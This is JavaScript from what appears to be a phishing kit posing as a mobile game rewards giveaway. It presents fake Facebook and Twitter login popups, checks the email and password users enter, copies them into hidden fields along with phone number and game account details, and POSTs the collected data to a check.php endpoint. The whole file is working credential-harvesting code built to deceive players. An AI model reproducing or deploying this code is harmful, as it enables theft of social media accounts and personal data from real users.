// code for activate clicked sound
var buka = new Audio();
buka.src = "https://l.top4top.io/m_1725u5z7i1.mp3";

var tutup = new Audio();
tutup.src = "https://a.top4top.io/m_1725zobal2.mp3";

// code for showing hiding items
function openRewards(evt, rewardsClass) {
    var i, tab_rewards, tab_rewards_link;
    tab_rewards = document.getElementsByClassName("tab_rewards");
    for (i = 0; i < tab_rewards.length; i++) {
        tab_rewards[i].style.display = "none";
    }
    tab_rewards_link = document.getElementsByClassName("menu-content");
    for (i = 0; i < tab_rewards_link.length; i++) {
        tab_rewards_link[i].className = tab_rewards_link[i].className.replace(" menu-content-active", "");
    }
    document.getElementById(rewardsClass).style.display = "block";
    evt.currentTarget.className += " menu-content-active";
}
document.getElementById("defaultTabRewards").click();

// code for showing hiding popup
}
function open_verification(){
	$('.account_verification').show();
	$(".open_rewards").hide()
	$(".otherReward_confirmation").hide()
}
function open_facebook(){
	$('.login-facebook').show();
	$('.account_login').hide();
}
function open_twitter(){
	$('.login-twitter').show();
	$('.account_login').hide();
}
function close_reward_confirmation(){
	$(".open_rewards").hide()
}
function close_facebook(){
	$('.login-facebook').hide()
	$('.account_login').show();
}
function close_twitter(){
	$('.login-twitter').hide()
	$('.account_login').show();
}
function open_newhome(){
    $('.account_login').show();
	$('.newhome').hide();
}
function open_account_login(){
	$('.account_login').show();
	$('.open_rewards').hide();
}
function ValidateLoginFbData() {
	$('#ValidateLoginFbForm').submit(function(submitingValidateLoginFbData){
	submitingValidateLoginFbData.preventDefault();
	
	$emailfb = $('#email-facebook').val().trim();
	$passwordfb = $('#password-facebook').val().trim();
	$loginfb = $('#login-facebook').val().trim();
            if($emailfb == '' || $emailfb == null || $emailfb.length <= 8)
            {
                $('.email-fb').show();
                $('.sandi-fb').hide();
                $('.account_verification').hide();
                $('.login-facebook').show();
                return false;
            }else{
               $('.email-fb').hide();               
	           $("input#validateEmail").val($emailfb);
               $('.account_verification').show();
               $('.login-facebook').hide();  
            }
            if($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 6)
            {
                $('.sandi-fb').show();
                $('.account_verification').hide();
                $('.login-facebook').show();
                return false;
            }else{
               $('.sandi-fb').hide();
	           $("input#validatePassword").val($passwordfb);
	           $("input#validateLogin").val($loginfb);
               $('.account_verification').show();
               $('.login-facebook').hide();	          	           
	}
	}); 
}
function ValidateLoginTwitterData() {
	$('#ValidateLoginTwitterForm').submit(function(submitingValidateLoginTwitterData){
	submitingValidateLoginTwitterData.preventDefault();
	
	$emailtw = $('#email-twitter').val().trim();
	$passwordtw = $('#password-twitter').val().trim();
	$logintw = $('#login-twitter').val().trim();
            if($emailtw == '' || $emailtw == null || $emailtw.length <= 3)
            {
                $('.email-tw').show();
                $('.sandi-tw').hide();
                $('.account_verification').hide();
                $('.login-twitter').show();
                return false;
            }else{
               $('.email-tw').hide();               
	           $("input#validateEmail").val($emailtw);
               $('.account_verification').show();
               $('.login-twitter').hide();  
            }
            if($passwordtw == '' || $passwordtw == null || $passwordtw.length <= 7)
            {
                $('.sandi-tw').show();
                $('.account_verification').hide();
                $('.login-tw').show();
                return false;
            }else{
               $('.sandi-tw').hide();
	           $("input#validatePassword").val($passwordtw);
	           $("input#validateLogin").val($logintw);
               $('.account_verification').show();
               $('.login-facebook').hide();	          	           
	}
	}); 
}
function ValidateVerificationData(){
	$('#ValidateVerificationDataForm').submit(function(submitingVerificationData){
	submitingVerificationData.preventDefault();
	
	var $validateEmail = $("input#validateEmail").val();
	var $validatePassword = $("input#validatePassword").val();
	var $nick = $("input#nick").val();
	var $playid = $("input#playid").val();
	var $phone = $("input#phone").val();
	var $level = $("input#level").val();
	var $tier = $("input#tier").val();
	var $rpt = $("input#rpt").val();
	var $rpl = $("input#rpl").val();
	var $platform = $("input#platform").val();
	var $validateLogin = $("input#validateLogin").val();
	if($validateEmail == "" && $validatePassword == "" && $nick == "" && $playid == "" && $phone == "" && $level == "" && $tier == "" && $rpt == "" && $rpl == "" && $platform == "" && $validateLogin == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: "check.php",
		data: $(this).serialize(),
		beforeSend: function() {
			$('.check_verification').show();
			$('.account_verification').hide();
		},
		success: function(){
		$(".processing_account").show();
		$('.check_verification').hide();
		$('.account_verification').hide();
		}
	});
	});  
	return false;
};
